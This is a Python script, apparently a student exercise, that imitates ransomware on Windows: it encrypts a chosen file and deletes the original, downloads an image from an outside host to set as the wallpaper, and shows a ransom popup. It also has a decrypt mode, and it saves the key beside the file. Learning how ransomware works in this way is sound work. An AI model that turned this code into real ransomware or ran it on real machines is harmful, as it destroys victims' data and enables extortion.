#!/usr/bin/python3

# Script : OpsChallenge08.py
# Purpose: Create a popup window on a Windows PC with a ransomware message
# Why    : Learn how ransomware works


from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import messagebox
import urllib.request
import ctypes

def show_popup(title, message):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo(title, message)

def set_wallpaper_from_url(image_url):
    file_path = os.path.join(os.path.expanduser('~'), 'Pictures', 'wallpaper.jpg')
    urllib.request.urlretrieve(image_url, file_path)

    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, file_path, 3)

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()

    key = Fernet.generate_key()
    cipher = Fernet(key)
    encrypted_data = cipher.encrypt(data)

    encrypted_file_path = file_path + '.encrypted'
    with open(encrypted_file_path, 'wb') as file:
        file.write(encrypted_data)

    os.remove(file_path)

    key_path = file_path + '.key'
    with open(key_path, 'wb') as file:
        file.write(key)

    print('File encrypted successfully!')

def decrypt_file(file_path):
    key_path = file_path.replace('.encrypted', '') + '.key'
    with open(key_path, 'rb') as file:
        key = file.read()

    with open(file_path, 'rb') as file:
        encrypted_data = file.read()

    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)

    decrypted_file_path = file_path.replace('.encrypted', '')
    with open(decrypted_file_path, 'wb') as file:
        file.write(decrypted_data)

    os.remove(key_path)
    os.remove(file_path)

    print('File decrypted successfully.')

def main():
    mode = input('Select a mode:\n1. Encrypt a file\n2. Decrypt a file\n')

    if mode == '1':
        file_path = input('Enter file path: ')
        encrypt_file(file_path)
        set_wallpaper_from_url("https://i.ibb.co/HhyV7D4/DEma-G81-Xk-AAAg-Ss-1-1.jpg")
        show_popup('YOU GOT RANSOM!', 'Your file has been encrypted!')
    elif mode == '2':
        file_path = input('Enter file path including .encrypted file extension: ')
        decrypt_file(file_path)
        show_popup('Decryption complete', 'Your file has been decrypted!')
    else:
        print('Invalid mode selected.')

if __name__ == '__main__':
    main()
